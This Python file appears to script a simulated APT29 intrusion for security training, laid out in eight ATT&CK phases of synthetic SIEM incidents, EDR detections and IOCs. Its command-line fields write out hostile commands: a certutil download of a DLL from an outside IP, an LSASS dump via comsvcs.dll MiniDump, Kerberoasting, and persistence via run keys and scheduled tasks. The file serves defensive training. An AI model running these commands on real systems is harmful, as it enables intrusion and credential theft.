"""
APT29 (Cozy Bear) Scenario Script.

Complete event script for APT29 with 8 phases mapped to the MITRE ATT&CK
framework. Includes 14 SIEM incidents, 15 EDR detections, and 7 Intel IOCs.

APT29 is a Russian state-sponsored threat group attributed to Russia's
Foreign Intelligence Service (SVR). They are known for sophisticated
espionage campaigns targeting government, diplomatic, think-tank,
healthcare, and energy organizations.

Phases:
  1. Initial Access - Spear-phishing with weaponized document
  2. Execution - PowerShell and WMI-based execution
  3. Persistence - Registry run key and scheduled task
  4. Privilege Escalation - Access token manipulation
  5. Defense Evasion - Process injection and timestomping
  6. Credential Access - LSASS memory dump
  7. Lateral Movement - RDP and SMB movement
  8. Exfiltration - HTTPS C2 data exfiltration
"""

from typing import Any, Dict, List


# =============================================================================
# Scenario Metadata
# =============================================================================

APT29_METADATA: Dict[str, Any] = {
    "id": "apt29",
    "name": "APT29 (Cozy Bear)",
    "description": (
        "Russian SVR-attributed espionage group targeting government and "
        "diplomatic entities. Known for sophisticated tradecraft including "
        "WellMess, WellMail, and SoreFang malware families."
    ),
    "total_phases": 8,
    "attribution": "Russia / SVR",
    "target_sector": "Government, Diplomatic, Think-Tank",
    "target_hosts": [
        "WS-EXEC-PC01",
        "WS-EXEC-PC02",
        "SRV-DC01",
        "SRV-FILE01",
        "SRV-MAIL01",
        "WS-IT-PC01",
    ],
}


# =============================================================================
# Phase Definitions
# =============================================================================

APT29_PHASES: Dict[int, Dict[str, Any]] = {
    # ------------------------------------------------------------------
    # Phase 1: Initial Access - Spear-phishing with weaponized document
    # ------------------------------------------------------------------
    1: {
        "name": "Initial Access",
        "mitre_tactic": "TA0001",
        "mitre_techniques": ["T1566.001", "T1204.002"],
        "description": (
            "APT29 delivers a spear-phishing email with a weaponized Word "
            "document to a senior executive. The document contains a macro "
            "that downloads and executes a first-stage dropper."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-001",
                "title": "Suspicious Email - Weaponized Document Attachment",
                "severity": "high",
                "status": "open",
                "timestamp": "2026-02-20T09:15:00Z",
                "source": "Email Gateway",
                "description": (
                    "Spear-phishing email detected targeting executive assistant. "
                    "Subject: 'Updated Trade Agreement Draft'. Attachment: "
                    "TradeAgreement_v3.docm contains obfuscated VBA macro."
                ),
                "mitre_tactic": "TA0001",
                "mitre_technique": "T1566.001",
                "source_ip": "185.29.8.162",
                "is_malicious_ip": True,
                "asset": "SRV-MAIL01",
                "detection_ids": ["DET-APT29-001"],
                "ioc_ids": ["IOC-APT29-001", "IOC-APT29-002"],
            },
            {
                "id": "INC-APT29-002",
                "title": "Macro Execution - Document Opened by User",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T09:22:00Z",
                "source": "EDR",
                "description": (
                    "User opened weaponized document on WS-EXEC-PC01. "
                    "VBA macro executed and spawned cmd.exe child process. "
                    "Outbound HTTP connection to C2 domain observed."
                ),
                "mitre_tactic": "TA0001",
                "mitre_technique": "T1204.002",
                "asset": "WS-EXEC-PC01",
                "c2_domain": "update-service.cozycloud[.]net",
                "detection_ids": ["DET-APT29-002"],
                "ioc_ids": ["IOC-APT29-003"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-001",
                "rule_name": "Suspicious Email Attachment - Macro Enabled Document",
                "severity": "high",
                "process_name": "outlook.exe",
                "host": "WS-EXEC-PC01",
                "pid": 3412,
                "mitre_technique": "T1566.001",
                "action_taken": "alerted",
                "file_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "is_malicious_hash": True,
                "command_line": "outlook.exe /f TradeAgreement_v3.docm",
            },
            {
                "id": "DET-APT29-002",
                "rule_name": "Macro Spawned Child Process",
                "severity": "critical",
                "process_name": "WINWORD.EXE",
                "host": "WS-EXEC-PC01",
                "pid": 4520,
                "mitre_technique": "T1204.002",
                "action_taken": "alerted",
                "command_line": "cmd.exe /c certutil -urlcache -split -f http://185.29.8.162/stage1.dll %TEMP%\\update.dll",
                "c2_domain": "update-service.cozycloud[.]net",
            },
        ],
        "intel_iocs": [
            {
                "id": "IOC-APT29-001",
                "type": "ip",
                "value": "185.29.8.162",
                "confidence_score": 92,
                "source": "MISP - APT29 Cluster",
                "associated_threat": "APT29 / Cozy Bear - C2 Infrastructure",
            },
            {
                "id": "IOC-APT29-002",
                "type": "email",
                "value": "trade.dept@diplomatic-mail[.]org",
                "confidence_score": 88,
                "source": "Internal Phishing Analysis",
                "associated_threat": "APT29 / Cozy Bear - Spear-phishing Campaign",
            },
            {
                "id": "IOC-APT29-003",
                "type": "domain",
                "value": "update-service.cozycloud[.]net",
                "confidence_score": 95,
                "source": "Threat Intel Platform",
                "associated_threat": "APT29 / Cozy Bear - WellMess C2 Domain",
            },
        ],
    },

    # ------------------------------------------------------------------
    # Phase 2: Execution - PowerShell and WMI
    # ------------------------------------------------------------------
    2: {
        "name": "Execution",
        "mitre_tactic": "TA0002",
        "mitre_techniques": ["T1059.001", "T1047"],
        "description": (
            "The dropper executes a PowerShell stager that downloads the "
            "main payload (WellMess backdoor). WMI is used for secondary "
            "process execution to evade command-line logging."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-003",
                "title": "Encoded PowerShell Execution Detected",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T09:25:00Z",
                "source": "EDR",
                "description": (
                    "Base64-encoded PowerShell command executed via cmd.exe "
                    "child of WINWORD.EXE. Decoded payload establishes "
                    "HTTPS reverse shell to 185.29.8.162:443."
                ),
                "mitre_tactic": "TA0002",
                "mitre_technique": "T1059.001",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-003"],
            },
            {
                "id": "INC-APT29-004",
                "title": "WMI Remote Process Creation",
                "severity": "high",
                "status": "open",
                "timestamp": "2026-02-20T09:28:00Z",
                "source": "Windows Event Log",
                "description": (
                    "WMI process creation event detected on WS-EXEC-PC01. "
                    "wmiprvse.exe spawned rundll32.exe to load WellMess DLL."
                ),
                "mitre_tactic": "TA0002",
                "mitre_technique": "T1047",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-004"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-003",
                "rule_name": "Encoded PowerShell Command Execution",
                "severity": "critical",
                "process_name": "powershell.exe",
                "host": "WS-EXEC-PC01",
                "pid": 5678,
                "mitre_technique": "T1059.001",
                "action_taken": "alerted",
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            },
            {
                "id": "DET-APT29-004",
                "rule_name": "WMI Process Creation via wmiprvse.exe",
                "severity": "high",
                "process_name": "wmiprvse.exe",
                "host": "WS-EXEC-PC01",
                "pid": 6789,
                "mitre_technique": "T1047",
                "action_taken": "alerted",
                "command_line": "rundll32.exe %TEMP%\\update.dll,DllRegisterServer",
            },
        ],
        "intel_iocs": [],
    },

    # ------------------------------------------------------------------
    # Phase 3: Persistence - Registry Run Key and Scheduled Task
    # ------------------------------------------------------------------
    3: {
        "name": "Persistence",
        "mitre_tactic": "TA0003",
        "mitre_techniques": ["T1547.001", "T1053.005"],
        "description": (
            "WellMess backdoor establishes persistence through a registry "
            "run key and a scheduled task disguised as a Windows Update "
            "service check."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-005",
                "title": "Registry Run Key Modification - Persistence",
                "severity": "high",
                "status": "open",
                "timestamp": "2026-02-20T09:32:00Z",
                "source": "EDR",
                "description": (
                    "Registry modification detected: "
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                    "added key 'WindowsUpdateSvc' pointing to malicious DLL."
                ),
                "mitre_tactic": "TA0003",
                "mitre_technique": "T1547.001",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-005"],
            },
            {
                "id": "INC-APT29-006",
                "title": "Suspicious Scheduled Task Created",
                "severity": "medium",
                "status": "open",
                "timestamp": "2026-02-20T09:35:00Z",
                "source": "Windows Event Log",
                "description": (
                    "Scheduled task 'WindowsUpdateCheck' created to execute "
                    "every 4 hours. Task runs rundll32 with suspicious DLL "
                    "from AppData\\Local\\Temp."
                ),
                "mitre_tactic": "TA0003",
                "mitre_technique": "T1053.005",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-006"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-005",
                "rule_name": "Registry Run Key Persistence",
                "severity": "high",
                "process_name": "reg.exe",
                "host": "WS-EXEC-PC01",
                "pid": 7890,
                "mitre_technique": "T1547.001",
                "action_taken": "alerted",
                "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateSvc /d rundll32.exe",
            },
            {
                "id": "DET-APT29-006",
                "rule_name": "Scheduled Task Created via schtasks",
                "severity": "medium",
                "process_name": "schtasks.exe",
                "host": "WS-EXEC-PC01",
                "pid": 8012,
                "mitre_technique": "T1053.005",
                "action_taken": "alerted",
                "command_line": "schtasks /create /tn WindowsUpdateCheck /tr rundll32.exe /sc hourly /mo 4",
            },
        ],
        "intel_iocs": [
            {
                "id": "IOC-APT29-004",
                "type": "hash",
                "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "confidence_score": 97,
                "source": "VirusTotal / MISP",
                "associated_threat": "APT29 / Cozy Bear - WellMess Backdoor",
            },
        ],
    },

    # ------------------------------------------------------------------
    # Phase 4: Privilege Escalation - Token Manipulation
    # ------------------------------------------------------------------
    4: {
        "name": "Privilege Escalation",
        "mitre_tactic": "TA0004",
        "mitre_techniques": ["T1134.001", "T1078.002"],
        "description": (
            "The attacker steals an access token from a privileged process "
            "to escalate from user-level to local admin. They also exploit "
            "a cached domain admin session."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-007",
                "title": "Access Token Manipulation Detected",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T10:05:00Z",
                "source": "EDR",
                "description": (
                    "Process token manipulation detected on WS-EXEC-PC01. "
                    "WellMess duplicated token from svchost.exe (SYSTEM) "
                    "and created new process with elevated privileges."
                ),
                "mitre_tactic": "TA0004",
                "mitre_technique": "T1134.001",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-007"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-007",
                "rule_name": "Token Theft - DuplicateToken API Call",
                "severity": "critical",
                "process_name": "rundll32.exe",
                "host": "WS-EXEC-PC01",
                "pid": 9102,
                "mitre_technique": "T1134.001",
                "action_taken": "alerted",
                "command_line": "rundll32.exe update.dll,DllRegisterServer",
            },
            {
                "id": "DET-APT29-008",
                "rule_name": "Suspicious Logon with Cached Credentials",
                "severity": "high",
                "process_name": "lsass.exe",
                "host": "WS-EXEC-PC01",
                "pid": 612,
                "mitre_technique": "T1078.002",
                "action_taken": "alerted",
                "command_line": "N/A - System Process",
            },
        ],
        "intel_iocs": [],
    },

    # ------------------------------------------------------------------
    # Phase 5: Defense Evasion - Process Injection
    # ------------------------------------------------------------------
    5: {
        "name": "Defense Evasion",
        "mitre_tactic": "TA0005",
        "mitre_techniques": ["T1055.001", "T1070.006"],
        "description": (
            "WellMess injects its payload into a legitimate Windows process "
            "(svchost.exe) via DLL injection to evade detection. It also "
            "timestomps dropped files to blend with system binaries."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-008",
                "title": "DLL Injection into svchost.exe Detected",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T10:15:00Z",
                "source": "EDR",
                "description": (
                    "Process injection detected: rundll32.exe loaded "
                    "malicious DLL into svchost.exe process space. "
                    "This is a classic APT29 defense evasion technique."
                ),
                "mitre_tactic": "TA0005",
                "mitre_technique": "T1055.001",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-009"],
            },
            {
                "id": "INC-APT29-009",
                "title": "File Timestomping Detected",
                "severity": "medium",
                "status": "open",
                "timestamp": "2026-02-20T10:18:00Z",
                "source": "EDR",
                "description": (
                    "Multiple file timestamps modified to match system "
                    "file dates. Targets: update.dll, config.dat in "
                    "AppData\\Local\\Temp directory."
                ),
                "mitre_tactic": "TA0005",
                "mitre_technique": "T1070.006",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-010"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-009",
                "rule_name": "DLL Injection via CreateRemoteThread",
                "severity": "critical",
                "process_name": "svchost.exe",
                "host": "WS-EXEC-PC01",
                "pid": 1024,
                "mitre_technique": "T1055.001",
                "action_taken": "alerted",
                "command_line": "svchost.exe -k netsvcs (injected)",
            },
            {
                "id": "DET-APT29-010",
                "rule_name": "File Timestamp Modification",
                "severity": "medium",
                "process_name": "rundll32.exe",
                "host": "WS-EXEC-PC01",
                "pid": 9102,
                "mitre_technique": "T1070.006",
                "action_taken": "logged",
                "command_line": "SetFileTime API call on update.dll",
            },
        ],
        "intel_iocs": [],
    },

    # ------------------------------------------------------------------
    # Phase 6: Credential Access - LSASS Memory Dump
    # ------------------------------------------------------------------
    6: {
        "name": "Credential Access",
        "mitre_tactic": "TA0006",
        "mitre_techniques": ["T1003.001", "T1558.003"],
        "description": (
            "The attacker dumps LSASS process memory to extract domain "
            "credentials. They also perform Kerberoasting to crack "
            "service account passwords offline."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-010",
                "title": "LSASS Memory Access - Credential Dumping",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T10:45:00Z",
                "source": "EDR",
                "description": (
                    "Process accessed LSASS memory using MiniDumpWriteDump. "
                    "Memory dump written to %TEMP%\\debug.dmp. Likely "
                    "credential harvesting for domain admin accounts."
                ),
                "mitre_tactic": "TA0006",
                "mitre_technique": "T1003.001",
                "asset": "WS-EXEC-PC01",
                "detection_ids": ["DET-APT29-011"],
            },
            {
                "id": "INC-APT29-011",
                "title": "Kerberoasting Activity Detected",
                "severity": "high",
                "status": "open",
                "timestamp": "2026-02-20T10:52:00Z",
                "source": "Active Directory",
                "description": (
                    "Anomalous TGS-REQ requests for multiple service "
                    "accounts detected from WS-EXEC-PC01. Pattern "
                    "consistent with Kerberoasting attack."
                ),
                "mitre_tactic": "TA0006",
                "mitre_technique": "T1558.003",
                "asset": "SRV-DC01",
                "detection_ids": ["DET-APT29-012"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-011",
                "rule_name": "LSASS Memory Dump via MiniDumpWriteDump",
                "severity": "critical",
                "process_name": "rundll32.exe",
                "host": "WS-EXEC-PC01",
                "pid": 9102,
                "mitre_technique": "T1003.001",
                "action_taken": "alerted",
                "command_line": "rundll32.exe comsvcs.dll,MiniDump 612 %TEMP%\\debug.dmp full",
            },
            {
                "id": "DET-APT29-012",
                "rule_name": "Kerberoasting - Bulk TGS Requests",
                "severity": "high",
                "process_name": "powershell.exe",
                "host": "WS-EXEC-PC01",
                "pid": 10234,
                "mitre_technique": "T1558.003",
                "action_taken": "alerted",
                "command_line": "powershell.exe -c Get-DomainSPNTicket -OutputFormat Hashcat",
            },
        ],
        "intel_iocs": [
            {
                "id": "IOC-APT29-005",
                "type": "hash",
                "value": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3",
                "confidence_score": 90,
                "source": "Sandbox Analysis",
                "associated_threat": "APT29 / Cozy Bear - Credential Dumper Tool",
            },
        ],
    },

    # ------------------------------------------------------------------
    # Phase 7: Lateral Movement - RDP and SMB
    # ------------------------------------------------------------------
    7: {
        "name": "Lateral Movement",
        "mitre_tactic": "TA0008",
        "mitre_techniques": ["T1021.001", "T1021.002"],
        "description": (
            "Using harvested domain admin credentials, the attacker moves "
            "laterally to the file server via SMB and to a second "
            "workstation via RDP. They deploy WellMess on each new host."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-012",
                "title": "Lateral Movement via RDP - Suspicious Login",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T11:10:00Z",
                "source": "Windows Event Log",
                "description": (
                    "RDP session from WS-EXEC-PC01 to WS-EXEC-PC02 using "
                    "domain admin credentials. Session initiated outside "
                    "normal business hours for this account."
                ),
                "mitre_tactic": "TA0008",
                "mitre_technique": "T1021.001",
                "asset": "WS-EXEC-PC02",
                "detection_ids": ["DET-APT29-013"],
            },
            {
                "id": "INC-APT29-013",
                "title": "SMB Lateral Movement to File Server",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T11:18:00Z",
                "source": "Network IDS",
                "description": (
                    "SMB file copy detected from WS-EXEC-PC01 to "
                    "SRV-FILE01. Binary update.dll copied to admin share "
                    "C$\\Windows\\Temp\\. Service created for execution."
                ),
                "mitre_tactic": "TA0008",
                "mitre_technique": "T1021.002",
                "asset": "SRV-FILE01",
                "detection_ids": ["DET-APT29-014"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-013",
                "rule_name": "Suspicious RDP Lateral Movement",
                "severity": "critical",
                "process_name": "mstsc.exe",
                "host": "WS-EXEC-PC02",
                "pid": 2345,
                "mitre_technique": "T1021.001",
                "action_taken": "alerted",
                "command_line": "mstsc.exe /v:WS-EXEC-PC02",
            },
            {
                "id": "DET-APT29-014",
                "rule_name": "SMB Admin Share File Copy",
                "severity": "critical",
                "process_name": "cmd.exe",
                "host": "SRV-FILE01",
                "pid": 3456,
                "mitre_technique": "T1021.002",
                "action_taken": "alerted",
                "command_line": "copy update.dll \\\\SRV-FILE01\\C$\\Windows\\Temp\\",
            },
        ],
        "intel_iocs": [
            {
                "id": "IOC-APT29-006",
                "type": "ip",
                "value": "10.20.30.45",
                "confidence_score": 75,
                "source": "Internal Network Analysis",
                "associated_threat": "APT29 / Cozy Bear - Lateral Movement Pivot",
            },
        ],
    },

    # ------------------------------------------------------------------
    # Phase 8: Exfiltration - HTTPS C2 Data Exfil
    # ------------------------------------------------------------------
    8: {
        "name": "Exfiltration",
        "mitre_tactic": "TA0010",
        "mitre_techniques": ["T1041", "T1560.001"],
        "description": (
            "The attacker collects and compresses sensitive documents from "
            "the file server, then exfiltrates them over the HTTPS C2 "
            "channel to an external staging server."
        ),
        "siem_incidents": [
            {
                "id": "INC-APT29-014",
                "title": "Data Exfiltration via HTTPS C2 Channel",
                "severity": "critical",
                "status": "open",
                "timestamp": "2026-02-20T11:45:00Z",
                "source": "Network DLP",
                "description": (
                    "Large encrypted data transfer detected to external IP "
                    "45.77.65.211 over HTTPS. Transfer volume: 2.3GB in "
                    "15 minutes from SRV-FILE01. Data likely contains "
                    "compressed archive of sensitive documents."
                ),
                "mitre_tactic": "TA0010",
                "mitre_technique": "T1041",
                "source_ip": "45.77.65.211",
                "is_malicious_ip": True,
                "asset": "SRV-FILE01",
                "c2_domain": "update-service.cozycloud[.]net",
                "detection_ids": ["DET-APT29-015"],
                "ioc_ids": ["IOC-APT29-007"],
            },
        ],
        "edr_detections": [
            {
                "id": "DET-APT29-015",
                "rule_name": "Suspicious Outbound Data Transfer",
                "severity": "critical",
                "process_name": "svchost.exe",
                "host": "SRV-FILE01",
                "pid": 4567,
                "mitre_technique": "T1041",
                "action_taken": "alerted",
                "command_line": "svchost.exe -k netsvcs (injected - C2 exfil)",
                "c2_domain": "update-service.cozycloud[.]net",
            },
        ],
        "intel_iocs": [
            {
                "id": "IOC-APT29-007",
                "type": "ip",
                "value": "45.77.65.211",
                "confidence_score": 94,
                "source": "Threat Intel Platform",
                "associated_threat": "APT29 / Cozy Bear - Exfiltration Staging Server",
            },
        ],
    },
}


# =============================================================================
# Cumulative Data Retrieval Functions
# =============================================================================

def get_cumulative_incidents(up_to_phase: int) -> List[Dict[str, Any]]:
    """Get all SIEM incidents up to and including the given phase.

    This implements the cumulative data model: phase N includes all data
    from phases 1 through N (BR-009).

    Args:
        up_to_phase: Phase number (1-8) to collect incidents up to.

    Returns:
        List of SIEM incidents from phase 1 through up_to_phase.
    """
    incidents = []
    seen_ids = set()
    for phase_num in range(1, up_to_phase + 1):
        if phase_num in APT29_PHASES:
            for inc in APT29_PHASES[phase_num]["siem_incidents"]:
                if inc["id"] not in seen_ids:
                    incidents.append(inc)
                    seen_ids.add(inc["id"])
    return incidents


def get_cumulative_detections(up_to_phase: int) -> List[Dict[str, Any]]:
    """Get all EDR detections up to and including the given phase.

    Args:
        up_to_phase: Phase number (1-8) to collect detections up to.

    Returns:
        List of EDR detections from phase 1 through up_to_phase.
    """
    detections = []
    seen_ids = set()
    for phase_num in range(1, up_to_phase + 1):
        if phase_num in APT29_PHASES:
            for det in APT29_PHASES[phase_num]["edr_detections"]:
                if det["id"] not in seen_ids:
                    detections.append(det)
                    seen_ids.add(det["id"])
    return detections


def get_cumulative_iocs(up_to_phase: int) -> List[Dict[str, Any]]:
    """Get all Intel IOCs up to and including the given phase.

    Args:
        up_to_phase: Phase number (1-8) to collect IOCs up to.

    Returns:
        List of IOCs from phase 1 through up_to_phase.
    """
    iocs = []
    seen_ids = set()
    for phase_num in range(1, up_to_phase + 1):
        if phase_num in APT29_PHASES:
            for ioc in APT29_PHASES[phase_num]["intel_iocs"]:
                if ioc["id"] not in seen_ids:
                    iocs.append(ioc)
                    seen_ids.add(ioc["id"])
    return iocs
